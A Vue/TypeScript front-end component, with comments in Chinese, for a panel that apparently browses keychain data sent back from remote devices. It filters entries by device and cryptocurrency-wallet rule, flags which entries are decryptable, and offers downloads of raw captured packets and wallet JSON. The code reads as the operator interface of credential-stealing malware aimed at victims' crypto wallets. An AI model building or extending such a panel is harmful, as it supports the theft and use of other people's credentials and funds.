<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { useRouter } from 'vue-router'
import { panelApi } from '@/api/panel'
import type { KeychainDevice, KeychainItemRow } from '@/api/types'
import { Download } from '@element-plus/icons-vue'
import EmptyState from '@/components/EmptyState.vue'
import { tsShort } from '@/utils/format'
import { clip } from '@/utils/format'

/**
 * 钱包钥匙串 —— 简洁列表模式：
 * 一张扁平列表（仅钱包包名命中条目），行点击跳转 /wallet/:id 详情解析页。
 * 设备 / 钱包筛选收敛进顶部工具条，下载（war 包 / 钱包 JSON）挂当前设备。
 */
const router = useRouter()

const devices = ref<KeychainDevice[]>([])
const rows = ref<KeychainItemRow[]>([])
const total = ref(0)
const page = ref(1)
const per = 50
const loading = ref(false)

const activeDevice = ref('') // '' = 全部设备
const activeWallet = ref('') // '' = 全部钱包

/** 钱包 chip 计数（无筛选全量统计，独立于当前分页） */
const wallets = ref<Array<[string, number]>>([])

async function loadWalletTags() {
  try {
    const r = await panelApi.keychain('', '', '', 1, 500, '')
    const seen = new Map<string, number>()
    for (const x of r?.rows ?? []) {
      const w = String(x.wallet_rule ?? '')
      if (w) seen.set(w, (seen.get(w) ?? 0) + 1)
    }
    wallets.value = [...seen.entries()].sort((a, b) => b[1] - a[1])
  } catch {
    wallets.value = []
  }
}

async function loadMeta() {
  try {
    const d = await panelApi.keychainDevices()
    devices.value = d?.devices ?? []
  } catch {
    devices.value = []
  }
}

async function load() {
  loading.value = true
  try {
    const r = await panelApi.keychain('', '', activeWallet.value, page.value, per, activeDevice.value)
    rows.value = r?.rows ?? []
    total.value = Number(r?.total ?? 0)
  } catch {
    rows.value = []
    total.value = 0
  } finally {
    loading.value = false
  }
}

/** 设备卡点击（点已选中的=回归全部设备） */
function selectDevice(uuid: string) {
  activeDevice.value = activeDevice.value === uuid ? '' : uuid
  page.value = 1
  void load()
}

/** 钱包 chip 点击切换筛选（再点一次=全部） */
function selectWallet(w: string) {
  activeWallet.value = activeWallet.value === w ? '' : w
  page.value = 1
  void load()
}

/** 列表行点击 → 跳转该条目详情解析页 */
function openDetail(row: KeychainItemRow) {
  void router.push(`/wallet/${Number(row.id ?? 0)}`)
}

onMounted(async () => {
  await loadMeta()
  void load()
  void loadWalletTags()
})

function pcLabel(pc?: string) {
  const n = Number(pc ?? 0)
  return n === 9 || n === 10 || n === 11 ? 'ok' : 'enc'
}
</script>

<template>
  <div class="kc">
    <section class="app-card">
      <div class="app-card__body">
        <!-- 设备直列（同设备列表按钮风格，无下拉）：点击过滤，可下钻详情，按钮挂下载 -->
        <div class="devs">
          <button
            v-for="d in devices"
            :key="d.device_uuid"
            class="dev"
            :class="{ 'is-active': String(d.device_uuid ?? '') === activeDevice }"
            @click="selectDevice(String(d.device_uuid ?? ''))"
          >
            <div class="dev__top">
              <b class="mono">{{ clip(String(d.device_uuid || '(未知)'), 18) }}</b>
              <span class="dev__wallets">
                {{ d.wallet_kinds ?? 0 }} 钱包 / {{ d.total_items ?? 0 }} 条
              </span>
            </div>
            <span class="dev__ts">回传 {{ tsShort(d.last_recv ?? '') }}</span>
            <div class="dev__dl" @click.stop>
              <a
                v-if="d.war_pid"
                class="dev__btn"
                title="下载该次 war 原包（正文不经库）"
                :href="`/panel/api/keychain/war_download?packet_id=${d.war_pid}`"
                download
              >
                <el-icon><Download /></el-icon>war 包
              </a>
              <a
                class="dev__btn"
                title="下载钱包扫描结果 JSON"
                :href="`/panel/api/keychain/wallet_export?uuid=${encodeURIComponent(String(d.device_uuid ?? ''))}`"
                download
              >
                <el-icon><Download /></el-icon>钱包 JSON
              </a>
            </div>
          </button>
          <EmptyState v-if="!devices.length && !loading" text="暂无钱包命中设备（war 端点尚无回传）" />
        </div>

        <!-- 钱包 chip 行（无下拉）：点击过滤，再点一次恢复全部 -->
        <div v-if="wallets.length" class="wtags">
          <button class="wtag" :class="{ 'is-active': activeWallet === '' }" @click="selectWallet('')">
            全部钱包
          </button>
          <button
            v-for="[w, n] in wallets"
            :key="w"
            class="wtag"
            :class="{ 'is-active': activeWallet === w }"
            @click="selectWallet(w)"
          >
            {{ w }} <i>{{ n }}</i>
          </button>
        </div>
      </div>
    </section>

    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title">
          <el-icon><Coin /></el-icon>钱包命中
          <span class="chip">共 {{ total }}</span>
          <span class="chip chip--warn">点击行查看详细解析</span>
        </h3>
        <el-button size="small" :loading="loading" @click="loadMeta">刷新</el-button>
      </div>

      <div class="app-card__body app-card__body--flush">
        <el-table
          :data="rows"
          size="small"
          height="calc(100vh - 330px)"
          empty-text="…"
          class="kc__list"
          @row-click="openDetail"
        >
          <el-table-column label="钱包" width="130">
            <template #default="{ row }">
              <span class="chip chip--brand">{{ row.wallet_rule || '-' }}</span>
            </template>
          </el-table-column>
          <el-table-column label="设备" width="190">
            <template #default="{ row }">
              <span class="mono t-2">{{ clip(String(row.device_uuid || '-'), 18) }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="service" label="service" min-width="220">
            <template #default="{ row }"><span class="mono t-2 break-all">{{ row.service || '-' }}</span></template>
          </el-table-column>
          <el-table-column prop="account" label="account" min-width="150">
            <template #default="{ row }"><span class="mono t-3 break-all">{{ row.account || '-' }}</span></template>
          </el-table-column>
          <el-table-column label="表" width="70">
            <template #default="{ row }"><span class="chip mono">{{ row.tbl || '-' }}</span></template>
          </el-table-column>
          <el-table-column label="状态" width="80">
            <template #default="{ row }">
              <span class="chip" :class="pcLabel(row.protection_class) === 'ok' ? 'chip--ok' : ''">
                {{ pcLabel(row.protection_class) === 'ok' ? '可解密' : '加密' }}
              </span>
            </template>
          </el-table-column>
          <el-table-column prop="recv_ts" label="回传" width="150">
            <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.recv_ts) }}</span></template>
          </el-table-column>
          <el-table-column width="40" align="right">
            <template #default><span class="mono t-3">›</span></template>
          </el-table-column>
          <template #empty><EmptyState text="暂无钱包命中条目" /></template>
        </el-table>
      </div>

      <div class="pager">
        <el-pagination
          v-model:current-page="page"
          :page-size="per"
          :total="total"
          layout="prev, pager, next, total"
          small
          background
          @current-change="load"
        />
      </div>
    </section>
  </div>
</template>

<style scoped>
.kc {
  display: flex;
  flex-direction: column;
  gap: var(--sp-4);
}
/* 设备直列（设备列表同款按钮风格） */
.devs {
  display: flex;
  flex-wrap: wrap;
  gap: var(--sp-2);
}
.dev {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  gap: 2px;
  padding: 8px var(--sp-4);
  border-radius: var(--r-md);
  border: 1px solid var(--border);
  background: var(--bg-card);
  color: var(--text-2);
  cursor: pointer;
  transition: all var(--dur-fast) var(--ease);
}
.dev:hover {
  border-color: var(--border-glow);
  color: var(--text-1);
}
.dev.is-active {
  background: var(--bg-active);
  border-color: var(--border-glow);
  color: var(--brand-2);
}
.dev__top {
  display: flex;
  align-items: center;
  gap: var(--sp-2);
}
.dev__wallets {
  padding: 1px 8px;
  border-radius: 999px;
  background: var(--bg-card-alt);
  font-size: var(--fs-xs);
  color: var(--brand-2);
  white-space: nowrap;
}
.dev__ts {
  font-size: var(--fs-xs);
  color: var(--text-3);
}
.dev__dl {
  display: flex;
  gap: 6px;
  margin-top: 4px;
  padding-top: 4px;
  border-top: 1px dashed var(--border);
}
.dev__btn {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 8px;
  border-radius: var(--r-sm);
  border: 1px solid var(--border);
  background: var(--bg-card-alt);
  color: var(--text-2);
  font-size: var(--fs-xs);
  text-decoration: none;
  transition: all var(--dur-fast) var(--ease);
}
.dev__btn:hover {
  border-color: var(--border-glow);
  color: var(--brand-2);
}
/* 钱包 chip 过滤行 */
.wtags {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-top: var(--sp-3);
  padding-top: var(--sp-3);
  border-top: 1px dashed var(--border);
}
.wtag {
  padding: 3px 12px;
  border-radius: 999px;
  border: 1px solid var(--border);
  background: var(--bg-card-alt);
  color: var(--text-2);
  font-size: var(--fs-xs);
  cursor: pointer;
  transition: all var(--dur-fast) var(--ease);
}
.wtag:hover {
  border-color: var(--border-glow);
  color: var(--brand-2);
}
.wtag.is-active {
  background: var(--bg-active);
  border-color: var(--border-glow);
  color: var(--brand-2);
}
.wtag i {
  font-style: normal;
  color: var(--text-3);
  margin-left: 2px;
}
.kc__list :deep(.el-row) {
  cursor: pointer;
}
.pager {
  padding: var(--sp-3) var(--sp-5);
  border-top: 1px solid var(--border);
  display: flex;
  justify-content: flex-end;
}
</style>
